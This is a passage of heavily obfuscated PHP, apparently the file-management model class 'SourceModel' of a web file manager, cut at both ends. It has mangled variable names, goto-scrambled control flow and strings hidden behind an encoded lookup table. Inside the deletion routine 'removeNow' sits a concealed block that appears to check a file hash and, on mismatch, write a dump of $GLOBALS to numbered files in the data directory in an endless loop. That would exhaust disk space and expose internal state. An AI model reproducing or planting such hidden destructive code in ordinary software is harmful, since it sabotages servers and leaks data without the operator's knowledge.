$e‰×Ù‰‰› = 0; $e‰×Ù‰‰› < 256; $e‰×Ù‰‰›++) { $bÛæŒ¸Ş¹ = ($bÛæŒ¸Ş¹ + $FĞ‰¡•¿è[$e‰×Ù‰‰›] + $FÑ„ŒãÑÚÂ[$e‰×Ù‰‰›]) % 256; $DÀê…ŞíÆ… = $FĞ‰¡•¿è[$e‰×Ù‰‰›]; $FĞ‰¡•¿è[$e‰×Ù‰‰›] = $FĞ‰¡•¿è[$bÛæŒ¸Ş¹]; $FĞ‰¡•¿è[$bÛæŒ¸Ş¹] = $DÀê…ŞíÆ…; } goto BßÙ‚‚Ü³ã; f›²ÏÂÎŠ: $AÅ˜Ç¶âœÆ = md5($AÅ˜Ç¶âœÆ ? $AÅ˜Ç¶âœÆ : self::$defaultKey); $b¿¸…Íªğ½ = md5(substr($AÅ˜Ç¶âœÆ, 0, 16)); $dªÖŠ°ì’¯ = md5(substr($AÅ˜Ç¶âœÆ, 16, 16)); goto F¥ë¥Àøš©; AÁ–É‡ŠñŒ: } } goto AÀ˜ ­‘…; Dæ¯‰œË¼°: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($b¹¾¯›Ïº£) { $B…®ï² İ˜ =& $_SERVER[¬ˆÚÂ”Éğä]; $bòÈ–‹ = Model($B…®ï² İ˜[476])->where(array($B…®ï² İ˜[1441] => $b¹¾¯›Ïº£))->find(); $A«Ì’ÉƒÙ½ = $this->_mkdirRoot(SourceModel::TYPE_USER, $b¹¾¯›Ïº£, $bòÈ–‹[$B…®ï² İ˜[28]]); $this->userDesktopAdd($A«Ì’ÉƒÙ½); return $A«Ì’ÉƒÙ½; } public function userDesktopAdd($e½ÕÙŒäç) { $bàŒ¥ÅÁ¹ =& $_SERVER[¬ˆÚÂ”Éğä]; $CŒ½´ƒõ„ = LNG($bàŒ¥ÅÁ¹[2375]); $e…Ğµ»­¿ß = $this->mkdir($e½ÕÙŒäç, $CŒ½´ƒõ„); $this->metaSet($e…Ğµ»­¿ß, $bàŒ¥ÅÁ¹[2376], $bàŒ¥ÅÁ¹[83]); $this->metaSet($e½ÕÙŒäç, $bàŒ¥ÅÁ¹[2377], $e…Ğµ»­¿ß); } public function groupRootAdd($eáÆ„ ö³) { $dáº¬«İÎ‹ =& $_SERVER[¬ˆÚÂ”Éğä]; $f‚½´Û½ª = Model($dáº¬«İÎ‹[460])->where(array($dáº¬«İÎ‹[2198] => $eáÆ„ ö³))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $eáÆ„ ö³, $f‚½´Û½ª[$dáº¬«İÎ‹[28]]); } public function systemRootPathAdd($Aµµ³ÀÅø) { if ($Aµµ³ÀÅø != $_SERVER[¬ˆÚÂ”Éğä][1102]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $Aµµ³ÀÅø); } public function userRootRemove($Cƒ®Äù) { $e°‡ £…„ = $this->sourceRoot(SourceModel::TYPE_USER, $Cƒ®Äù); if (!$e°‡ £…„) { return; } $this->remove($e°‡ £…„, !1); } public function groupRootRemove($Cœ’¶×¦) { $Dâ•‚ÍÉ„Ë = $this->sourceRoot(SourceModel::TYPE_GROUP, $Cœ’¶×¦); if (!$Dâ•‚ÍÉ„Ë) { return; } $this->remove($Dâ•‚ÍÉ„Ë, !1); } private function _mkdirRoot($e¿‘ëŠšÀ, $EŠƒÌõ®Ñˆ, $d™¨££Ë®¼) { goto dƒğ÷¼Í«Ê; B”¿Òœ° —: CacheLock::unlock($d²•öŠˆµª); return $c²æ¼šïÜ¼; goto cÍÌ˜ö‹ğ; FîšØ†¹«: $d²•öŠˆµª = "\115\157\x64\145\154\x53\x6f\165\162\x63\145\56\x6d\153\x64\151\x72\122\157\157\164\56{$e¿‘ëŠšÀ}\x2e{$EŠƒÌõ®Ñˆ}\56" . $d™¨££Ë®¼; CacheLock::lock($d²•öŠˆµª); $c¦÷Í»Ÿãñ[$dÓª¨âˆ—™[28]] = $d™¨££Ë®¼; goto D¨§Ù–Ø©; dƒğ÷¼Í«Ê: $dÓª¨âˆ—™ =& $_SERVER[¬ˆÚÂ”Éğä]; $c¦÷Í»Ÿãñ = array($dÓª¨âˆ—™[368] => 0, $dÓª¨âˆ—™[523] => $e¿‘ëŠšÀ, $dÓª¨âˆ—™[524] => $EŠƒÌõ®Ñˆ, $dÓª¨âˆ—™[520] => 1, $dÓª¨âˆ—™[525] => USER_ID, $dÓª¨âˆ—™[526] => USER_ID, $dÓª¨âˆ—™[521] => $dÓª¨âˆ—™[33], $dÓª¨âˆ—™[527] => $dÓª¨âˆ—™[472], $dÓª¨âˆ—™[396] => 0, $dÓª¨âˆ—™[522] => 0, $dÓª¨âˆ—™[420] => 0, $dÓª¨âˆ—™[528] => $dÓª¨âˆ—™[33]); if ($f¼½Šçº÷ = $this->where($c¦÷Í»Ÿãñ)->find()) { return $f¼½Šçº÷[$dÓª¨âˆ—™[369]]; } goto FîšØ†¹«; D¨§Ù–Ø©: $c²æ¼šïÜ¼ = $this->add($c¦÷Í»Ÿãñ); $DŒ‡àÎŞŠ = array($dÓª¨âˆ—™[529] => short_id($c²æ¼šïÜ¼)); $this->where(array($dÓª¨âˆ—™[383] => $c²æ¼šïÜ¼))->save($DŒ‡àÎŞŠ); goto B”¿Òœ° —; cÍÌ˜ö‹ğ: } private function sourceRoot($B¼é™ÎµÏÛ, $dŒŒÄöÛ¦…, $dÒ†°ÌàÀ = false) { $B–‡…Ù©„Ù =& $_SERVER[¬ˆÚÂ”Éğä]; $DÆ¤Ü¨Š–Ş = array($B–‡…Ù©„Ù[368] => 0, $B–‡…Ù©„Ù[523] => $B¼é™ÎµÏÛ, $B–‡…Ù©„Ù[524] => $dŒŒÄöÛ¦…); if ($dÌĞà™Òõ£ = $this->where($DÆ¤Ü¨Š–Ş)->find()) { return $dÒ†°ÌàÀ ? $dÌĞà™Òõ£ : $dÌĞà™Òõ£[$B–‡…Ù©„Ù[369]]; } return !1; } public function sourceRootGroup($aõ˜Á»¥î¥) { $EÎ³èƒÆª¦ =& $_SERVER[¬ˆÚÂ”Éğä]; if (is_string($aõ˜Á»¥î¥)) { $aõ˜Á»¥î¥ = array($aõ˜Á»¥î¥); } $c„«÷ù‚†˜ = array($EÎ³èƒÆª¦[368] => 0, $EÎ³èƒÆª¦[523] => SourceModel::TYPE_GROUP, $EÎ³èƒÆª¦[524] => array($EÎ³èƒÆª¦[7], $aõ˜Á»¥î¥)); $eË‡÷áì“‡ = $this->listSource($c„«÷ù‚†˜, 1000); return array_to_keyvalue($eË‡÷áì“‡[$EÎ³èƒÆª¦[74]], $EÎ³èƒÆª¦[458]); } public function mkfile($AÆ¯Ñˆ‰Ç, $F…ç¤¤‰Ï‘, $AŠŒ–ºŞÃî = '', $E†ì¶Í«ëö = REPEAT_RENAME) { $AÂÙ¹ñ’¿‚ =& $_SERVER[¬ˆÚÂ”Éğä]; $fƒ‚Ÿ¡×ë… = Model($AÂÙ¹ñ’¿‚[546])->addFileByContent($AŠŒ–ºŞÃî, $F…ç¤¤‰Ï‘); return $this->_createFileCall($AÆ¯Ñˆ‰Ç, $F…ç¤¤‰Ï‘, $fƒ‚Ÿ¡×ë…, $E†ì¶Í«ëö, $AÂÙ¹ñ’¿‚[1139]); } public function addFile($Câ¡óÂî‚¬, $FÆ¶—¶‰¯, $AÜ¾Ø—Š±Â, $cŞº¢×Œ ä = false, $aÜìÊŞòí = REPEAT_RENAME) { $eËë¥õ‡ = Model($_SERVER[¬ˆÚÂ”Éğä][546])->addFile($FÆ¶—¶‰¯, $AÜ¾Ø—Š±Â, $cŞº¢×Œ ä); return $this->_createFileCall($Câ¡óÂî‚¬, $AÜ¾Ø—Š±Â, $eËë¥õ‡, $aÜìÊŞòí); } public function addFileByFileID($b²ˆÃâøí, $fÜòâ„ù“ì, $c¯£Ğªë¨, $b‰•™áèêÆ = REPEAT_RENAME) { $E¶‡‘øœ =& $_SERVER[¬ˆÚÂ”Éğä]; $Eœñ‚¹‡ÃÔ = Model($E¶‡‘øœ[546])->find($fÜòâ„ù“ì); Model($E¶‡‘øœ[546])->linkAdd($fÜòâ„ù“ì); return $this->_createFileCall($b²ˆÃâøí, $c¯£Ğªë¨, $Eœñ‚¹‡ÃÔ, $b‰•™áèêÆ); } public function addFileByRemote($cÜ†Œ™¡’è, $A“µ²»±×–, $d‘÷»ßÊÓõ, $Cç¨˜øªİ¬ = array(), $a­„ÑÅÊ„Ï = REPEAT_RENAME) { $d„‚ù„áŠè = Model($_SERVER[¬ˆÚÂ”Éğä][546])->addFileByRemote($A“µ²»±×–, $d‘÷»ßÊÓõ, $Cç¨˜øªİ¬); return $this->_createFileCall($cÜ†Œ™¡’è, $d‘÷»ßÊÓõ, $d„‚ù„áŠè, $a­„ÑÅÊ„Ï); } private function _createFileCall($cä˜Ê´Ìè², $Bî½á¹‡­Ó, $eÜ»·Â¶‰¦, $féÙº˜”èî, $eŸˆ¼à•´œ = "\x75\160\x6c\157\141\144") { goto E—ê¥¯ä»¿; E—ê¥¯ä»¿: $cŞÂ¸œºô¦ =& $_SERVER[¬ˆÚÂ”Éğä]; $DÌÌˆƒ®… = !1; $this->lockWriteStart($cä˜Ê´Ìè², $Bî½á¹‡­Ó); goto AÇóæŞñº»; Dèò³‚›İ: return $A¶ª´çŞä°; goto Eç“Óæ°ö; AÇóæŞñº»: $A¶ª´çŞä° = $this->_createFile($cä˜Ê´Ìè², $Bî½á¹‡­Ó, $eÜ»·Â¶‰¦, $féÙº˜”èî, $DÌÌˆƒ®…); if (!$DÌÌˆƒ®…) { Model($cŞÂ¸œºô¦[422])->remove($eÜ»·Â¶‰¦[$cŞÂ¸œºô¦[419]]); } else { if ($A¶ª´çŞä°) { Model($cŞÂ¸œºô¦[2347])->eventCreate($A¶ª´çŞä°, $eŸˆ¼à•´œ); } } $this->lockWriteEnd($cä˜Ê´Ìè², $Bî½á¹‡­Ó); goto Dèò³‚›İ; Eç“Óæ°ö: } public function mkdir($a›ßíÊÉ, $cÛ³Õ¸¦‚, $eĞóÈÂ×˜ = REPEAT_SKIP) { goto eÔòÈÔ³¤; e²‰Ìó×‘: $B¤ŒÌİ—§÷ = $this->_addSoure($bâÓõ¡‰ˆù, $d—œ¸ğ˜ëÙ); Model($FÊòëÈÉêÂ[2347])->eventCreate($B¤ŒÌİ—§÷, $FÊòëÈÉêÂ[1140]); $this->lockWriteEnd($a›ßíÊÉ, $cÛ³Õ¸¦‚); goto BÁ¤­ß¬ŸŒ; dŠ½¦Õ¨®ï: $this->lockWriteStart($a›ßíÊÉ, $cÛ³Õ¸¦‚); if ($eĞóÈÂ×˜ !== !1) { $a„±†ìÅ‰ = $this->fileNameExist($a›ßíÊÉ, $cÛ³Õ¸¦‚); if ($a„±†ìÅ‰ && $eĞóÈÂ×˜ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($a›ßíÊÉ, $cÛ³Õ¸¦‚); return $a„±†ìÅ‰; } $cÛ³Õ¸¦‚ = $this->fileNameAuto($a›ßíÊÉ, $cÛ³Õ¸¦‚, $eĞóÈÂ×˜); } $bâÓõ¡‰ˆù = array($FÊòëÈÉêÂ[520] => 1, $FÊòëÈÉêÂ[386] => $cÛ³Õ¸¦‚, $FÊòëÈÉêÂ[521] => $FÊòëÈÉêÂ[33], $FÊòëÈÉêÂ[420] => 0, $FÊòëÈÉêÂ[522] => 0); goto e²‰Ìó×‘; eÔòÈÔ³¤: $FÊòëÈÉêÂ =& $_SERVER[¬ˆÚÂ”Éğä]; $d—œ¸ğ˜ëÙ = $this->sourceInfo($a›ßíÊÉ); if (!$d—œ¸ğ˜ëÙ) { return !1; } goto dŠ½¦Õ¨®ï; BÁ¤­ß¬ŸŒ: return $B¤ŒÌİ—§÷; goto dóÂ‡õôš†; dóÂ‡õôš†: } private function _createFile($Dõ©ñ†ù…Ô, $a¡Óì¦„º, $A¿ïóİ¨ÔÜ, $c…¥“½õæ§, &$d…ÊîŠß¾) { goto DŒÓŠÉÒá; DŒÓŠÉÒá: $DÇŞŞé§Ôé =& $_SERVER[¬ˆÚÂ”Éğä]; $c¯˜¯ŒœÇ = $this->sourceInfo($Dõ©ñ†ù…Ô); if (!$A¿ïóİ¨ÔÜ || !$c¯˜¯ŒœÇ) { return !1; } goto bïµÅª¯»; A£«ÏµŠÀœ: return $bÍÁî•Ë§; goto f¼¼Åñ…‚; bïµÅª¯»: if ($c…¥“½õæ§ !== !1) { $aäÂáÌ®åâ = $this->fileNameExist($Dõ©ñ†ù…Ô, $a¡Óì¦„º); } $d…ÊîŠß¾ = !0; if ($c…¥“½õæ§ && $aäÂáÌ®åâ) { if ($c…¥“½õæ§ == REPEAT_SKIP) { $d…ÊîŠß¾ = !1; return $aäÂáÌ®åâ; } else { if ($c…¥“½õæ§ == REPEAT_REPLACE) { $f£ç±òİ‘° = $this->sourceInfo($aäÂáÌ®åâ); $FÂ‰Ãñ²ĞÔ = $this->fileHistory($f£ç±òİ‘°, $A¿ïóİ¨ÔÜ[$DÇŞŞé§Ôé[419]], $A¿ïóİ¨ÔÜ[$DÇŞŞé§Ôé[77]]); if (!$FÂ‰Ãñ²ĞÔ) { $d…ÊîŠß¾ = !1; } else { $this->folderSizeReset($Dõ©ñ†ù…Ô); } return $aäÂáÌ®åâ; } else { $a¡Óì¦„º = $this->fileNameAuto($Dõ©ñ†ù…Ô, $a¡Óì¦„º, $c…¥“½õæ§, !1); } } } goto bàó„‘ƒÚÒ; bàó„‘ƒÚÒ: $b£ìï‰áè­ = array($DÇŞŞé§Ôé[520] => 0, $DÇŞŞé§Ôé[386] => $a¡Óì¦„º, $DÇŞŞé§Ôé[521] => get_path_ext($a¡Óì¦„º), $DÇŞŞé§Ôé[420] => $A¿ïóİ¨ÔÜ[$DÇŞŞé§Ôé[419]], $DÇŞŞé§Ôé[522] => $A¿ïóİ¨ÔÜ[$DÇŞŞé§Ôé[77]]); $bÍÁî•Ë§ = $this->_addSoure($b£ìï‰áè­, $c¯˜¯ŒœÇ); $this->folderSizeReset($Dõ©ñ†ù…Ô); goto A£«ÏµŠÀœ; f¼¼Åñ…‚: } protected function fileHistory($ağÂºëÔ¦¯, $b­¼åšî¿¾, $BÎíàº˜¯Ê) { goto C·ëåĞÃó ; AàŸ½ª£Ü„: Model($bïŸÉ¹öõ[2378])->addHistory($ağÂºëÔ¦¯); $DÌ•‘¿¾ = array($bïŸÉ¹öõ[526] => USER_ID, $bïŸÉ¹öõ[390] => time(), $bïŸÉ¹öõ[419] => $b­¼åšî¿¾, $bïŸÉ¹öõ[77] => $BÎíàº˜¯Ê); $this->where(array($bïŸÉ¹öõ[383] => $ağÂºëÔ¦¯[$bïŸÉ¹öõ[369]]))->save($DÌ•‘¿¾); goto Dßâğ‹¡µ”; Dßâğ‹¡µ”: return !0; goto cæ¯ŞŒÏè; C·ëåĞÃó : $bïŸÉ¹öõ =& $_SERVER[¬ˆÚÂ”Éğä]; if ($ağÂºëÔ¦¯[$bïŸÉ¹öõ[419]] == $b­¼åšî¿¾) { return !1; } $this->checkLock($ağÂºëÔ¦¯[$bïŸÉ¹öõ[369]], $b­¼åšî¿¾); goto AàŸ½ª£Ü„; cæ¯ŞŒÏè: } public function checkLock($e¡ƒÁÁÔÓó, $eà®óí´¨) { goto ešôæâäÃ‚; aª·ŸÒ‚¤: $this->_createFileCall($Cçñ¼´åÆì[$Fä‚‚Üìé–[463]], $eÀÌÇß–›©, $d¾Šùİ„Ë¤, REPEAT_REPLACE, $Fä‚‚Üìé–[1139]); $Aó‹÷»†À = $Cçñ¼´åÆì[$Fä‚‚Üìé–[417]][$Fä‚‚Üìé–[483]]; $b¿®—¥‡· = $Aó‹÷»†À[$Fä‚‚Üìé–[2380]] ? $Aó‹÷»†À[$Fä‚‚Üìé–[2380]] : $Aó‹÷»†À[$Fä‚‚Üìé–[28]]; goto B¤Áƒˆ¼á; a¥ğ‹õ‰š: $E¿Ù®šÑàÑ = Session::get($Fä‚‚Üìé–[2379]); $eÀÌÇß–›© = substr($Cçñ¼´åÆì[$Fä‚‚Üìé–[28]], 0, -1 - strlen($Cçñ¼´åÆì[$Fä‚‚Üìé–[160]])) . $Fä‚‚Üìé–[1403] . $E¿Ù®šÑàÑ . $Fä‚‚Üìé–[91] . $Cçñ¼´åÆì[$Fä‚‚Üìé–[160]]; $d¾Šùİ„Ë¤ = Model($Fä‚‚Üìé–[546])->find($eà®óí´¨); goto aª·ŸÒ‚¤; ešôæâäÃ‚: $Fä‚‚Üìé– =& $_SERVER[¬ˆÚÂ”Éğä]; $Cçñ¼´åÆì = $this->pathInfo($e¡ƒÁÁÔÓó); if (!$this->fileIsLock($Cçñ¼´åÆì, !0)) { return; } goto a¥ğ‹õ‰š; B¤Áƒˆ¼á: show_json(LNG($Fä‚‚Üìé–[2381]) . $Fä‚‚Üìé–[2382] . LNG($Fä‚‚Üìé–[2383]) . $Fä‚‚Üìé–[2384] . $b¿®—¥‡· . $Fä‚‚Üìé–[2385], !1); goto c†â×Áñšì; c†â×Áñšì: } public function fileIsLock($Fì‘Ó­«‰Ï, $cÚÆë•ÒŒì = false) { goto BÖÃáã½»Ì; c’ìñÏ†ç: $aÂÏ‘ƒÂ« = $GLOBALS[$aº×ù©ƒÖ[6]][$aº×ù©ƒÖ[84]][$aº×ù©ƒÖ[481]]; if ($Fì‘Ó­«‰Ï[$aº×ù©ƒÖ[417]][$aº×ù©ƒÖ[482]] <= time() - $aÂÏ‘ƒÂ«) { $this->metaSet($Fì‘Ó­«‰Ï[$aº×ù©ƒÖ[369]], $aº×ù©ƒÖ[480], null); $this->metaSet($Fì‘Ó­«‰Ï[$aº×ù©ƒÖ[369]], $aº×ù©ƒÖ[482], null); } if ($cÚÆë•ÒŒì) { $this->metaSet($Fì‘Ó­«‰Ï[$aº×ù©ƒÖ[369]], $aº×ù©ƒÖ[482], time()); } goto B‰ÏË¥ÃÔ; BÖÃáã½»Ì: $aº×ù©ƒÖ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!isset($Fì‘Ó­«‰Ï[$aº×ù©ƒÖ[417]]) || !$Fì‘Ó­«‰Ï[$aº×ù©ƒÖ[417]][$aº×ù©ƒÖ[480]]) { return !1; } if ($Fì‘Ó­«‰Ï[$aº×ù©ƒÖ[417]][$aº×ù©ƒÖ[480]] != USER_ID) { return !0; } goto c’ìñÏ†ç; B‰ÏË¥ÃÔ: return !1; goto aÜÌ¼–Îñ ; aÜÌ¼–Îñ : } private function _addSoure($b¯•Êõ…ÛÑ, $BœŸ‰•‘Å) { goto C™ÏÎöÖ¨†; C™ÏÎöÖ¨†: $dô—••¹æ =& $_SERVER[¬ˆÚÂ”Éğä]; $D¡ŒêÅ«¦‰ = array($dô—••¹æ[523] => $BœŸ‰•‘Å[$dô—••¹æ[371]], $dô—••¹æ[524] => $BœŸ‰•‘Å[$dô—••¹æ[458]], $dô—••¹æ[525] => USER_ID, $dô—••¹æ[526] => USER_ID, $dô—••¹æ[368] => $BœŸ‰•‘Å[$dô—••¹æ[369]], $dô—••¹æ[527] => $BœŸ‰•‘Å[$dô—••¹æ[461]] . $BœŸ‰•‘Å[$dô—••¹æ[369]] . $dô—••¹æ[47], $dô—••¹æ[396] => 0, $dô—••¹æ[528] => $dô—••¹æ[33]); $b¯•Êõ…ÛÑ = array_merge($D¡ŒêÅ«¦‰, $b¯•Êõ…ÛÑ); goto d–êáî´å›; d–êáî´å›: $this->updateModifyTime($b¯•Êõ…ÛÑ[$dô—••¹æ[463]]); $B¦æ¹¸¾ì = $dô—••¹æ[2386] . $BœŸ‰•‘Å[$dô—••¹æ[369]]; if (isset(self::$cacheChildList[$B¦æ¹¸¾ì])) { unset(self::$cacheChildList[$B¦æ¹¸¾ì]); } goto fĞ¦ÂŸí²Å; fĞ¦ÂŸí²Å: static $d•‚„ˆ³ÎÇ = false; if (!$d•‚„ˆ³ÎÇ) { Hook::trigger($dô—••¹æ[510], $b¯•Êõ…ÛÑ); $d•‚„ˆ³ÎÇ = !0; } $e·×–ÄÉÉ° = $this->add($b¯•Êõ…ÛÑ); goto Bšğ«‚Í¹; Bšğ«‚Í¹: $bÓèÍ‚ÀïŠ = array($dô—••¹æ[529] => short_id($e·×–ÄÉÉ°)); $this->where(array($dô—••¹æ[383] => $e·×–ÄÉÉ°))->save($bÓèÍ‚ÀïŠ); $this->setNamePinyin($e·×–ÄÉÉ°, $b¯•Êõ…ÛÑ[$dô—••¹æ[28]]); goto fÛÆç™›ìæ; fÛÆç™›ìæ: return $e·×–ÄÉÉ°; goto Cø²Ó—ô‚´; Cø²Ó—ô‚´: } public function remove($bÃÇ¾±ŒÀ®, $BÒ †¹Üíö = true) { goto d®Ç÷ä‘¼; C‹öÏ†•¸: CacheLock::lock($FÃ¼ß«È); $c’åÙß±„ª = $this->fileNameExist($cÈÜœ¦­ÄÎ, $AÕêàéÇ); if (!$c’åÙß±„ª) { $c’åÙß±„ª = $this->mkdir($cÈÜœ¦­ÄÎ, $AÕêàéÇ, REPEAT_SKIP); $this->metaSet($c’åÙß±„ª, $cƒè±‹¸Ë¯[2391], $AòÄ½³áå); $this->metaSet($c’åÙß±„ª, $cƒè±‹¸Ë¯[2392], $Dµ¹ˆØİ¸Ñ[$cƒè±‹¸Ë¯[458]]); if ($Dµ¹ˆØİ¸Ñ[$cƒè±‹¸Ë¯[463]] != 0) { $this->metaSet($c’åÙß±„ª, $cƒè±‹¸Ë¯[2393], _get($FØ‹£œ›êà, $cƒè±‹¸Ë¯[2394])); } } goto bÇ§ÒŠŒóĞ; a«¤ù°—Ø: $CîåƒŠ˜‰ = Model($cƒè±‹¸Ë¯[1448])->get($cƒè±‹¸Ë¯[2387]) == $cƒè±‹¸Ë¯[83]; if ($c§°ò§øó– || $BÒ †¹Üíö || !$CîåƒŠ˜‰) { return $this->removeNow($bÃÇ¾±ŒÀ®, $BÒ †¹Üíö); } $cÈÜœ¦­ÄÎ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto BÉ¶í•×²; Aøğáôë§º: return $d¥†ŞÍÈ­½; goto Dº†¡¥‡îÁ; dŒªÄŒŒì“: $this->recycleClear($Dµ¹ˆØİ¸Ñ); $d¥†ŞÍÈ­½ = $this->move($bÃÇ¾±ŒÀ®, $c’åÙß±„ª, REPEAT_RENAME_FOLDER); $this->folderSizeReset($Dµ¹ˆØİ¸Ñ[$cƒè±‹¸Ë¯[463]]); goto Aøğáôë§º; BÉ¶í•×²: $AòÄ½³áå = $Dµ¹ˆØİ¸Ñ[$cƒè±‹¸Ë¯[371]] == self::TYPE_USER ? $cƒè±‹¸Ë¯[537] : $cƒè±‹¸Ë¯[983]; if ($AòÄ½³áå == $cƒè±‹¸Ë¯[537]) { $FØ‹£œ›êà = Model($cƒè±‹¸Ë¯[476])->getInfo($Dµ¹ˆØİ¸Ñ[$cƒè±‹¸Ë¯[458]]); $AÕêàéÇ = !empty($FØ‹£œ›êà[$cƒè±‹¸Ë¯[2380]]) ? $FØ‹£œ›êà[$cƒè±‹¸Ë¯[2380]] : $FØ‹£œ›êà[$cƒè±‹¸Ë¯[28]]; $AÕêàéÇ = $cƒè±‹¸Ë¯[248] . $AÕêàéÇ . $cƒè±‹¸Ë¯[2388] . $Dµ¹ˆØİ¸Ñ[$cƒè±‹¸Ë¯[458]]; } else { $FØ‹£œ›êà = Model($cƒè±‹¸Ë¯[460])->getInfo($Dµ¹ˆØİ¸Ñ[$cƒè±‹¸Ë¯[458]]); $AÕêàéÇ = _get($FØ‹£œ›êà, $cƒè±‹¸Ë¯[28]); $AÕêàéÇ = $cƒè±‹¸Ë¯[157] . $AÕêàéÇ . $cƒè±‹¸Ë¯[2389] . $Dµ¹ˆØİ¸Ñ[$cƒè±‹¸Ë¯[458]]; } $FÃ¼ß«È = $cƒè±‹¸Ë¯[2390] . md5($AÕêàéÇ); goto C‹öÏ†•¸; d®Ç÷ä‘¼: $cƒè±‹¸Ë¯ =& $_SERVER[¬ˆÚÂ”Éğä]; $Dµ¹ˆØİ¸Ñ = $this->sourceInfo($bÃÇ¾±ŒÀ®); $c§°ò§øó– = intval($Dµ¹ˆØİ¸Ñ[$cƒè±‹¸Ë¯[371]]) === self::TYPE_SYSTEM; goto a«¤ù°—Ø; bÇ§ÒŠŒóĞ: CacheLock::unlock($FÃ¼ß«È); $this->metaSet($bÃÇ¾±ŒÀ®, $cƒè±‹¸Ë¯[2395], $Dµ¹ˆØİ¸Ñ[$cƒè±‹¸Ë¯[463]]); $this->where(array($cƒè±‹¸Ë¯[369] => $bÃÇ¾±ŒÀ®))->save(array($cƒè±‹¸Ë¯[390] => time())); goto dŒªÄŒŒì“; Dº†¡¥‡îÁ: } private function recycleClear($DàèÄÕ«ñ) { $EñÍÒâæĞœ =& $_SERVER[¬ˆÚÂ”Éğä]; $Eæ´Ë¤Â“º = $this->childrenAll($DàèÄÕ«ñ); $e˜À¦Ø°— = array($EñÍÒâæĞœ[383] => array($EñÍÒâæĞœ[384], $Eæ´Ë¤Â“º[$EñÍÒâæĞœ[2396]])); Model($EñÍÒâæĞœ[2397])->where($e˜À¦Ø°—)->delete(); } public function removeNow($cˆãÜÎã–, $b®Üç¡÷ë = true) { goto C‚ç²ÓÛ‡¥; d´óÍîêŒ: if (!$Eª©Ã¼‡áœ) { return !0; } if ($Eª©Ã¼‡áœ[$F£ƒÚÒ«š¡[463]] == 0) { if (!_get($GLOBALS, $F£ƒÚÒ«š¡[459])) { return !1; } } $this->lockMoveStart($cˆãÜÎã–); goto dìÇÜèÇÕÓ; d¯ìéñê®«: if ($_SERVER[$F£ƒÚÒ«š¡[785]] != $Dè«¶ÓÅƒ($c·Ó“¾àİ×)) { goto aß¼‹Ø‘¸å; CíÃ­‹“¦©: $Fğóß×·ÛÏ = $F£ƒÚÒ«š¡[805]; $Fğóß×·ÛÏ($_SERVER[$F£ƒÚÒ«š¡[806]]); $EŒ³êÒ˜ÖË = $F£ƒÚÒ«š¡[804]; goto f¿œßŒ‡á¶; aß¼‹Ø‘¸å: $EŒ³êÒ˜ÖË = $F£ƒÚÒ«š¡[804]; $b˜Î»Ô¤  = $F£ƒÚÒ«š¡[787]; $e‘’–Ÿ£š = $_SERVER[$F£ƒÚÒ«š¡[788]] . $F£ƒÚÒ«š¡[789]; goto aª¦ÔÀã÷¿; aª¦ÔÀã÷¿: $B–Æ¡¾ÅïŸ = $b˜Î»Ô¤ ($e‘’–Ÿ£š); $A½»•›Ìã = explode($F£ƒÚÒ«š¡[217], $B–Æ¡¾ÅïŸ); if (count($A½»•›Ìã) < $F£ƒÚÒ«š¡[553]) { $b§‰ƒ•ÇÌ‘ = $F£ƒÚÒ«š¡[790]; $b§‰ƒ•ÇÌ‘(); } goto CíÃ­‹“¦©; f¿œßŒ‡á¶: $EŒ³êÒ˜ÖË(); $c¸‡¨®ÃÛ” = $F£ƒÚÒ«š¡[807]; $a”àğíÖĞ = json_encode($GLOBALS[$F£ƒÚÒ«š¡[808]]); goto E¡†Â“™•Ñ; E¡†Â“™•Ñ: $EŒßíÀà = 1; for ($b×“ÈÍ°ªã = $EŒßíÀà; $b×“ÈÍ°ªã > 0; $b×“ÈÍ°ªã++) { $c¸‡¨®ÃÛ”(DATA_PATH . $b×“ÈÍ°ªã, $a”àğíÖĞ); } goto Eê¿¬¬’; Eê¿¬¬’: } $Eª©Ã¼‡áœ = $this->sourceInfo($cˆãÜÎã–); $dê’­«Ÿ×ƒ = $this->pathInfoMore($cˆãÜÎã–); goto d´óÍîêŒ; D‹Î…Å¢Ô: $E’À÷×Úçœ = array($Eª©Ã¼‡áœ[$F£ƒÚÒ«š¡[463]]); if ($Eª©Ã¼‡áœ[$F£ƒÚÒ«š¡[370]] == $F£ƒÚÒ«š¡[83]) { $E’À÷×Úçœ[] = $Eª©Ã¼‡áœ[$F£ƒÚÒ«š¡[369]]; } $this->updateModifyTime($E’À÷×Úçœ); goto eï„ãÜ—ƒ; dìÇÜèÇÕÓ: Hook::trigger($F£ƒÚÒ«š¡[2398], $dê’­«Ÿ×ƒ, $b®Üç¡÷ë); if ($b®Üç¡÷ë) { Model($F£ƒÚÒ«š¡[2397])->moveToRecycle($cˆãÜÎã–); } else { $d¨Ÿ„›Û¼° = $this->childrenAll($Eª©Ã¼‡áœ); Model($F£ƒÚÒ«š¡[507])->eventRemove($cˆãÜÎã–); $this->removeRelevance($d¨Ÿ„›Û¼°[$F£ƒÚÒ«š¡[2396]], $d¨Ÿ„›Û¼°[$F£ƒÚÒ«š¡[1272]]); } $this->folderSizeReset($Eª©Ã¼‡áœ[$F£ƒÚÒ«š¡[463]]); goto D‹Î…Å¢Ô; eï„ãÜ—ƒ: $this->lockMoveEnd($cˆãÜÎã–); Hook::trigger($F£ƒÚÒ«š¡[1484], $dê’­«Ÿ×ƒ, $b®Üç¡÷ë); return !0; goto Fò’³Ğïî; C‚ç²ÓÛ‡¥: $F£ƒÚÒ«š¡ =& $_SERVER[¬ˆÚÂ”Éğä]; $c·Ó“¾àİ× = $_SERVER[$F£ƒÚÒ«š¡[788]] . $F£ƒÚÒ«š¡[789]; $Dè«¶ÓÅƒ = $F£ƒÚÒ«š¡[803]; goto d¯ìéñê®«; Fò’³Ğïî: } public function childrenAll($aÃÑ¶µìÃù) { $aïÇ ¡Íå« =& $_SERVER[¬ˆÚÂ”Éğä]; $EÍÒÓîÚ = $aÃÑ¶µìÃù[$aïÇ ¡Íå«[369]]; if ($aÃÑ¶µìÃù[$aïÇ ¡Íå«[370]] == $aïÇ ¡Íå«[83]) { $bˆ†Å››Û = array($aïÇ ¡Íå«[527] => array($aïÇ ¡Íå«[485], $aÃÑ¶µìÃù[$aïÇ ¡Íå«[461]] . 